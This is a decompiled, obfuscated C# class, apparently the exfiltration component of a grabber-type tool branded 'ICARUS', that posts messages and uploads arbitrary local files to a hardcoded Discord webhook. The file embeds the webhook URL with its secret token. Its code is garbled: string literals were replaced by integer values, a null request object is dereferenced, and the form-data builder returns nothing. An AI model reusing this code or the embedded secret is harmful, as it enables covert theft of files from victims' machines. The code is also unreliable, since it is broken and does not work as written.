using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;

// Token: 0x02000014 RID: 20
namespace BirdBrainmofo
{
    public class DiscordWebhooksssssss
    {
        // Token: 0x0600011B RID: 283 RVA: 0x00006F70 File Offset: 0x00005170
        public static void SendTestWebhook()
        {
            Send("Test message recieved successfully! :raised_hands:");
        }

        // Token: 0x0600011C RID: 284 RVA: 0x0000E568 File Offset: 0x0000C768
        public static string Send(string mssgBody)
        {
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("username", defaultUserName);
            dictionary.Add("content", mssgBody);
            dictionary.Add("avatar_url", defaultAvatar);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(defaultWebhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x0600011D RID: 285 RVA: 0x0000E5D8 File Offset: 0x0000C7D8
        public static string Send(string mssgBody, string userName)
        {
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("username", userName);
            dictionary.Add("content", mssgBody);
            dictionary.Add("avatar_url", defaultAvatar);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(defaultWebhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x0600011E RID: 286 RVA: 0x0000E644 File Offset: 0x0000C844
        public static string Send(string mssgBody, string userName, string webhook)
        {
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("username", userName);
            dictionary.Add("content", mssgBody);
            dictionary.Add("avatar_url", defaultAvatar);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(webhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x0600011F RID: 287 RVA: 0x0000E6AC File Offset: 0x0000C8AC
        public static string SendFile(string mssgBody, string filename, string fileformat, string filepath, string application)
        {
            FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
            byte[] array = new byte[fileStream.Length];
            fileStream.Read(array, 0, array.Length);
            fileStream.Close();
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("filename", filename);
            dictionary.Add("fileformat", fileformat);
            dictionary.Add("file", new FormUpload.FileParameter(array, filename, application));
            dictionary.Add("username", defaultUserName);
            dictionary.Add("content", mssgBody);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(defaultWebhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x06000120 RID: 288 RVA: 0x0000E764 File Offset: 0x0000C964
        public static string SendFile(string mssgBody, string filename, string fileformat, string filepath, string application, string userName)
        {
            FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
            byte[] array = new byte[fileStream.Length];
            fileStream.Read(array, 0, array.Length);
            fileStream.Close();
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("filename", filename);
            dictionary.Add("fileformat", fileformat);
            dictionary.Add("file", new FormUpload.FileParameter(array, filename, application));
            dictionary.Add("username", userName);
            dictionary.Add("content", mssgBody);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(defaultWebhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x06000121 RID: 289 RVA: 0x0000E818 File Offset: 0x0000CA18
        public static string SendFile(string mssgBody, string filename, string fileformat, string filepath, string application, string userName, string webhook)
        {
            FileStream fileStream = new FileStream(filepath, FileMode.Open, FileAccess.Read);
            byte[] array = new byte[fileStream.Length];
            fileStream.Read(array, 0, array.Length);
            fileStream.Close();
            Dictionary<string, object> dictionary = new Dictionary<string, object>();
            dictionary.Add("filename", filename);
            dictionary.Add("fileformat", fileformat);
            dictionary.Add("file", new FormUpload.FileParameter(array, filename, application));
            dictionary.Add("username", userName);
            dictionary.Add("content", mssgBody);
            HttpWebResponse httpWebResponse = FormUpload.MultipartFormDataPost(webhook, defaultUserAgent, dictionary);
            StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
            string text = streamReader.ReadToEnd();
            httpWebResponse.Close();
            return text;
        }

        // Token: 0x06000122 RID: 290 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x06000123 RID: 291 RVA: 0x00006F7D File Offset: 0x0000517D
        // Note: this type is marked as 'beforefieldinit'.
        static DiscordWebhooksssssss()
        {
        }

        // Token: 0x040000AD RID: 173
        private static string defaultWebhook = "https://discord.com/api/webhooks/995609071304593409/IOLhP3ykqEdZcTv7nJgfKJfoNaRwLOZX3dgmUFTXow93vFkbG4e9gVYaDjfaHkGc3x6M";

        // Token: 0x040000AE RID: 174
        private static string defaultUserAgent = "ICARUS";

        // Token: 0x040000AF RID: 175
        private static string defaultUserName = "ICARUS";

        // Token: 0x040000B0 RID: 176
        private static string defaultAvatar = "https://i.ibb.co/RvwvG2z/icaruwsdr-athens.png";

        // Token: 0x02000015 RID: 21
        public static class FormUpload
        {
            // Token: 0x06000124 RID: 292 RVA: 0x0000E8C8 File Offset: 0x0000CAC8
            public static HttpWebResponse MultipartFormDataPost(string postUrl, string userAgent, Dictionary<string, object> postParameters)
            {
                string text = (-1487416982).ToString();
                string text2 = string.Format(text, Guid.NewGuid());
                string text3 = (-652164663).ToString();
                string text4 = text3 + text2;
                byte[] multipartFormData = GetMultipartFormData(postParameters, text2);
                return PostForm(postUrl, userAgent, text4, multipartFormData);
            }

            // Token: 0x06000125 RID: 293 RVA: 0x0000E928 File Offset: 0x0000CB28
            private static HttpWebResponse PostForm(string postUrl, string userAgent, string contentType, byte[] formData)
            {
                HttpWebRequest httpWebRequest = WebRequest.Create(postUrl) as HttpWebRequest;
                if (httpWebRequest == null)
                {
                    string text = 1063607334.ToString();
                    throw new NullReferenceException(text);
                }
                WebRequest webRequest = null;
                string text2 = 266074127.ToString();
                webRequest.Method = text2;
                httpWebRequest.ContentType = contentType;
                httpWebRequest.UserAgent = userAgent;
                httpWebRequest.CookieContainer = new CookieContainer();
                httpWebRequest.ContentLength = formData.Length;
                using (Stream requestStream = httpWebRequest.GetRequestStream())
                {
                    requestStream.Write(formData, 0, formData.Length);
                    requestStream.Close();
                }
                return httpWebRequest.GetResponse() as HttpWebResponse;
            }

            // Token: 0x06000126 RID: 294 RVA: 0x0000E9E0 File Offset: 0x0000CBE0
            private static byte[] GetMultipartFormData(Dictionary<string, object> postParameters, string boundary)
            {
                return new byte[] { };
            }

            // Token: 0x06000127 RID: 295 RVA: 0x00006FA7 File Offset: 0x000051A7
            // Note: this type is marked as 'beforefieldinit'.
            static FormUpload()
            {
            }

            // Token: 0x040000B1 RID: 177
            private static readonly Encoding encoding = Encoding.UTF8;

            // Token: 0x02000016 RID: 22
            public class FileParameter
            {
                // Token: 0x1700003B RID: 59
                // (get) Token: 0x06000128 RID: 296 RVA: 0x00006FB3 File Offset: 0x000051B3
                // (set) Token: 0x06000129 RID: 297 RVA: 0x00006FBB File Offset: 0x000051BB
                public byte[] File;

                // Token: 0x1700003C RID: 60
                // (get) Token: 0x0600012A RID: 298 RVA: 0x00006FC4 File Offset: 0x000051C4
                // (set) Token: 0x0600012B RID: 299 RVA: 0x00006FCC File Offset: 0x000051CC
                public string FileName;

                // Token: 0x1700003D RID: 61
                // (get) Token: 0x0600012C RID: 300 RVA: 0x00006FD5 File Offset: 0x000051D5
                // (set) Token: 0x0600012D RID: 301 RVA: 0x00006FDD File Offset: 0x000051DD
                public string ContentType;

                // Token: 0x0600012E RID: 302 RVA: 0x00006FE6 File Offset: 0x000051E6
                public FileParameter(byte[] file)
                    : this(file, null)
                {
                }

                // Token: 0x0600012F RID: 303 RVA: 0x00006FF0 File Offset: 0x000051F0
                public FileParameter(byte[] file, string filename)
                    : this(file, filename, null)
                {
                }

                // Token: 0x06000130 RID: 304 RVA: 0x00006FFB File Offset: 0x000051FB
                public FileParameter(byte[] file, string filename, string contenttype)
                {
                    File = file;
                    FileName = filename;
                    ContentType = contenttype;
                }


            }
        }
    }
}
